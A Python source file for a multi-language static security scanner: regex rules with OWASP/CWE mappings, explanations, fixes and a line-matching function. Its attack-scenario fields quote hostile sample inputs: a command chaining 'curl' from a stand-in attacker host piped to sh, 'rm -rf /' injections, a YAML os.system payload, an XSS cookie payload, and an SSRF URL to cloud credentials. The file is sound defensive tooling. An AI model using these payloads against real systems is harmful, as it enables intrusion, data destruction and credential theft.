import re
from typing import List, Dict, Any

# Multi-Language Security Signatures with OWASP & CWE Mappings
MULTI_LANG_RULES = [
    # --- SQL INJECTION (OWASP A03 / CWE-89) ---
    {
        "id": "SEC-SQLI-01",
        "title": "SQL Injection (Dynamic String Concatenation)",
        "languages": ["Python", "Java", "JavaScript", "TypeScript", "PHP", "Go", "C#"],
        "severity": "CRITICAL",
        "category": "Injection",
        "cwe_id": "CWE-89",
        "pattern": r"(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+.*?(\+|%|\.format|\$|concat\(|f['\"]).*?(FROM|INTO|SET|WHERE|TABLE)|(SELECT|INSERT|UPDATE|DELETE)\s+.*?(FROM|INTO|SET|WHERE)\b.*?(\+|%|\.format|\$|f['\"])",
        "description": "SQL query is constructed using dynamic string formatting or concatenation rather than parameterized statements.",
        "why_dangerous": "An attacker can manipulate the query logic to bypass authentication, dump sensitive database tables, or execute administrative commands.",
        "attack_scenario": "Input: ' OR '1'='1' -- results in SELECT * FROM users WHERE username = '' OR '1'='1', returning all accounts.",
        "fix_recommendation": "Use parameterized queries or prepared statements with placeholder parameters (e.g. ? or %s).",
        "secure_code": "# Use parameterized queries instead of string concatenation:\ncursor.execute('SELECT * FROM users WHERE username = ?', (username,))"
    },
    {
        "id": "SEC-SQLI-02",
        "title": "Python SQLite / MySQL Raw Query Formatting",
        "languages": ["Python"],
        "severity": "CRITICAL",
        "category": "Injection",
        "cwe_id": "CWE-89",
        "pattern": r"\.execute\(\s*f['\"].*?\{.*?\}|cursor\.execute\(['\"].*?%\s*\(",
        "description": "Direct f-string or %-formatting inside a database execute() method.",
        "why_dangerous": "Bypasses database driver sanitization, enabling direct SQL Injection.",
        "attack_scenario": "User inputs malicious SQL payloads through query parameters.",
        "fix_recommendation": "Pass query parameters as a separate tuple/list argument to execute().",
        "secure_code": "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))"
    },

    # --- COMMAND INJECTION (OWASP A03 / CWE-78) ---
    {
        "id": "SEC-CMDI-01",
        "title": "OS Command Injection (Shell Execution with Untrusted Input)",
        "languages": ["Python"],
        "severity": "CRITICAL",
        "category": "Injection",
        "cwe_id": "CWE-78",
        "pattern": r"(os\.system|os\.popen|subprocess\.call|subprocess\.Popen|subprocess\.run)\s*\([^)]*shell\s*=\s*True",
        "description": "Executing system shell commands with shell=True or direct system() invocations.",
        "why_dangerous": "If user input reaches the shell, command chaining characters (;, &, |, `) allow remote command execution on the host server.",
        "attack_scenario": "Input: 'test; rm -rf /' or 'file.txt & curl http://attacker.com/malware | sh'.",
        "fix_recommendation": "Set shell=False and pass arguments as a list of strings, or use shlex.quote() / built-in libraries.",
        "secure_code": "import subprocess\nsubprocess.run(['ping', '-c', '1', host], shell=False, check=True)"
    },
    {
        "id": "SEC-CMDI-02",
        "title": "Node.js Child Process Command Execution",
        "languages": ["JavaScript", "TypeScript"],
        "severity": "CRITICAL",
        "category": "Injection",
        "cwe_id": "CWE-78",
        "pattern": r"(child_process\.exec|execSync)\s*\(\s*`[^`]*\${.*?}`,?|child_process\.exec\s*\([^,]+(\+)",
        "description": "Executing system commands with string concatenation or template literals in Node.js.",
        "why_dangerous": "Allows arbitrary code execution with the permissions of the Node process.",
        "attack_scenario": "An attacker injects bash delimiters to execute remote reverse shells.",
        "fix_recommendation": "Use child_process.execFile() or spawn() with argument arrays.",
        "secure_code": "const { execFile } = require('child_process');\nexecFile('ls', ['-lh', userDir], (error, stdout) => { ... });"
    },

    # --- CODE INJECTION / EVAL (OWASP A03 / CWE-94) ---
    {
        "id": "SEC-CODEI-01",
        "title": "Arbitrary Code Execution via eval() / exec()",
        "languages": ["Python", "JavaScript", "TypeScript", "PHP"],
        "severity": "CRITICAL",
        "category": "Injection",
        "cwe_id": "CWE-94",
        "pattern": r"(?<!\w)(eval|exec)\s*\([^)]+\)",
        "description": "Use of eval() or exec() executes arbitrary code supplied in string format.",
        "why_dangerous": "Direct execution of arbitrary attacker-controlled logic leads to complete host compromise.",
        "attack_scenario": "Attacker supplies '__import__(\"os\").system(\"whoami\")' into eval().",
        "fix_recommendation": "Use ast.literal_eval() for data parsing, JSON.parse() in JS, or safe dispatch tables.",
        "secure_code": "import ast\nsafe_data = ast.literal_eval(user_input_string)"
    },

    # --- INSECURE DESERIALIZATION (OWASP A08 / CWE-502) ---
    {
        "id": "SEC-DESER-01",
        "title": "Insecure Deserialization via pickle",
        "languages": ["Python"],
        "severity": "CRITICAL",
        "category": "Software and Data Integrity Failures",
        "cwe_id": "CWE-502",
        "pattern": r"(pickle\.loads|pickle\.load|_pickle\.loads|shelve\.open)\s*\(",
        "description": "Deserializing untrusted data with Python's pickle module.",
        "why_dangerous": "Pickle payloads can craft __reduce__ methods that execute arbitrary shell commands upon unpickling.",
        "attack_scenario": "Attacker creates a pickled gadget object that triggers a reverse shell when loaded.",
        "fix_recommendation": "Use safe serialization formats like JSON, Protocol Buffers, or HMAC-signed tokens.",
        "secure_code": "import json\ndata = json.loads(payload)"
    },
    {
        "id": "SEC-DESER-02",
        "title": "Unsafe YAML Deserialization",
        "languages": ["Python"],
        "severity": "HIGH",
        "category": "Software and Data Integrity Failures",
        "cwe_id": "CWE-502",
        "pattern": r"yaml\.(load|load_all)\s*\([^)]*Loader\s*=\s*(yaml\.)?(Loader|UnsafeLoader|FullLoader)?\s*\)",
        "description": "yaml.load called without SafeLoader allows Python object instantiation.",
        "why_dangerous": "Untrusted YAML documents can trigger arbitrary object construction and command execution.",
        "attack_scenario": "Attacker injects '!!python/object/apply:os.system [\"rm -rf /\"]' into YAML config.",
        "fix_recommendation": "Always use yaml.safe_load() instead of yaml.load().",
        "secure_code": "import yaml\nconfig = yaml.safe_load(yaml_string)"
    },

    # --- CROSS-SITE SCRIPTING (OWASP A03 / CWE-79) ---
    {
        "id": "SEC-XSS-01",
        "title": "DOM-Based Cross-Site Scripting (innerHTML / document.write)",
        "languages": ["JavaScript", "TypeScript", "HTML"],
        "severity": "HIGH",
        "category": "Injection",
        "cwe_id": "CWE-79",
        "pattern": r"(\.innerHTML|\.outerHTML|document\.write\(|document\.writeln\()\s*=",
        "description": "Assigning unescaped user input to innerHTML or using document.write().",
        "why_dangerous": "Allows malicious scripts to run in victims' browsers, hijacking sessions, stealing cookies, or defacing sites.",
        "attack_scenario": "Attacker injects '<img src=x onerror=alert(document.cookie)>' into the page.",
        "fix_recommendation": "Use textContent or innerText, or sanitize with DOMPurify before inserting.",
        "secure_code": "element.textContent = userMessage; // or DOMPurify.sanitize(input)"
    },
    {
        "id": "SEC-XSS-02",
        "title": "React dangerouslySetInnerHTML Exposure",
        "languages": ["JavaScript", "TypeScript"],
        "severity": "HIGH",
        "category": "Injection",
        "cwe_id": "CWE-79",
        "pattern": r"dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:",
        "description": "Directly injecting HTML via React dangerouslySetInnerHTML without sanitization.",
        "why_dangerous": "Bypasses React's built-in XSS protections.",
        "attack_scenario": "User supplied bio or comment containing script payloads executes in client context.",
        "fix_recommendation": "Sanitize HTML using DOMPurify before setting __html.",
        "secure_code": "<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />"
    },

    # --- CRYPTOGRAPHIC WEAKNESSES (OWASP A02 / CWE-327 & CWE-328) ---
    {
        "id": "SEC-CRYPTO-01",
        "title": "Use of Broken Cryptographic Hash (MD5 / SHA1)",
        "languages": ["Python", "Java", "JavaScript", "TypeScript", "C", "C++", "Go"],
        "severity": "MEDIUM",
        "category": "Cryptographic Failures",
        "cwe_id": "CWE-328",
        "pattern": r"(hashlib\.(md5|sha1)|MessageDigest\.getInstance\(['\"](MD5|SHA-?1)['\"]\)|crypto\.createHash\(['\"](md5|sha1)['\"]\))",
        "description": "MD5 and SHA-1 have known collision vulnerabilities and must not be used for security-critical contexts.",
        "why_dangerous": "Attackers can generate colliding certificates, checksums, or forge signatures.",
        "attack_scenario": "Pre-computed rainbow tables or hash collisions allow attackers to crack hashed passwords or forge digital signatures.",
        "fix_recommendation": "Upgrade to SHA-256, SHA-512, or BLAKE2 for hashing, and bcrypt/argon2 for passwords.",
        "secure_code": "import hashlib\nhash_val = hashlib.sha256(data).hexdigest()"
    },
    {
        "id": "SEC-CRYPTO-02",
        "title": "Weak Pseudorandom Generator for Cryptography",
        "languages": ["Python", "JavaScript", "Java"],
        "severity": "MEDIUM",
        "category": "Cryptographic Failures",
        "cwe_id": "CWE-338",
        "pattern": r"(random\.random\(|random\.randint\(|Math\.random\(|new Random\(\))",
        "description": "Using non-cryptographic PRNG (Mersenne Twister / Math.random) for security tokens.",
        "why_dangerous": "PRNG states can be mathematically predicted by observing initial outputs, allowing token forgery.",
        "attack_scenario": "Attacker predicts password reset tokens or session IDs.",
        "fix_recommendation": "Use secrets module in Python or crypto.getRandomValues() in JavaScript.",
        "secure_code": "import secrets\nreset_token = secrets.token_urlsafe(32)"
    },

    # --- PATH TRAVERSAL (OWASP A01 / CWE-22) ---
    {
        "id": "SEC-PATH-01",
        "title": "Path Traversal / Arbitrary File Access",
        "languages": ["Python", "Java", "JavaScript", "PHP"],
        "severity": "HIGH",
        "category": "Broken Access Control",
        "cwe_id": "CWE-22",
        "pattern": r"(open\s*\([^)]*(\+|f['\"]).*?\)|fs\.readFile\([^)]*(\+|`))",
        "description": "Opening file paths constructed by concatenating user-controlled variables.",
        "why_dangerous": "Directory traversal sequences (../) allow attackers to read /etc/passwd or application source files.",
        "attack_scenario": "Filename input: '../../../../etc/shadow'.",
        "fix_recommendation": "Resolve real paths and verify they reside within the designated safe directory.",
        "secure_code": "safe_dir = Path('/safe/dir').resolve()\ntarget = (safe_dir / filename).resolve()\nif not str(target).startswith(str(safe_dir)):\n    raise ValueError('Path traversal attempt!')"
    },

    # --- SECURITY MISCONFIGURATION (OWASP A05 / CWE-1188) ---
    {
        "id": "SEC-CONFIG-01",
        "title": "Debug Mode Enabled in Web Application",
        "languages": ["Python"],
        "severity": "HIGH",
        "category": "Security Misconfiguration",
        "cwe_id": "CWE-215",
        "pattern": r"(app\.run\([^)]*debug\s*=\s*True|DEBUG\s*=\s*True)",
        "description": "Flask/Django debug mode enabled in code.",
        "why_dangerous": "Debug mode exposes interactive stack traces and interactive Werkzeug debug consoles with remote PIN execution.",
        "attack_scenario": "Attacker triggers an unhandled exception to access the interactive web debugger.",
        "fix_recommendation": "Set DEBUG to False in production environments via environment variables.",
        "secure_code": "import os\nDEBUG = os.getenv('FLASK_DEBUG', 'False').lower() == 'true'"
    },

    # --- SERVER-SIDE REQUEST FORGERY (OWASP A10 / CWE-918) ---
    {
        "id": "SEC-SSRF-01",
        "title": "Potential Server-Side Request Forgery (SSRF)",
        "languages": ["Python", "JavaScript", "Go"],
        "severity": "HIGH",
        "category": "Server-Side Request Forgery (SSRF)",
        "cwe_id": "CWE-918",
        "pattern": r"(requests\.(get|post|put)\s*\([^)]*(\+|f['\"]).*?\)|fetch\s*\([^)]*(\+|`))",
        "description": "Making HTTP requests to URLs constructed directly from dynamic variables.",
        "why_dangerous": "Attackers can induce the server to make requests to internal services (e.g. 169.254.169.254 metadata, localhost admin panels).",
        "attack_scenario": "URL parameter set to 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'.",
        "fix_recommendation": "Validate target IP addresses against private CIDR ranges and whitelist allowed domains.",
        "secure_code": "# Verify URL against allowed whitelist and block loopback/cloud metadata IP ranges"
    }
]

def scan_custom_rules(code: str, language: str = "Python") -> List[Dict[str, Any]]:
    """
    Applies regex and pattern heuristics to find security flaws across languages.
    """
    findings = []
    lines = code.splitlines()

    for rule in MULTI_LANG_RULES:
        # Check if rule applies to the given language
        if language != "Unknown" and rule["languages"] and language not in rule["languages"] and "All" not in rule["languages"]:
            continue

        compiled_re = re.compile(rule["pattern"], re.IGNORECASE)
        for idx, line in enumerate(lines, start=1):
            # Skip pure single line comment lines
            stripped = line.strip()
            if stripped.startswith(("#", "//", "/*", "*", "--")):
                continue

            match = compiled_re.search(line)
            if match:
                findings.append({
                    "title": rule.get("title", "Security Finding"),
                    "severity": rule.get("severity", "LOW"),
                    "category": rule.get("category", "General"),
                    "cwe_id": rule.get("cwe_id", "CWE-Security"),
                    "line_number": idx,
                    "snippet": stripped[:150],
                    "description": rule.get("description", ""),
                    "why_dangerous": rule.get("why_dangerous", ""),
                    "attack_scenario": rule.get("attack_scenario", "An unauthorized actor could leverage this flaw to compromise system assets."),
                    "fix_recommendation": rule.get("fix_recommendation", "Refactor the pattern following secure coding principles."),
                    "secure_code": rule.get("secure_code", "# Consult secure guidelines for replacement"),
                    "scanner_source": "RuleEngine-OWASP"
                })

    return findings
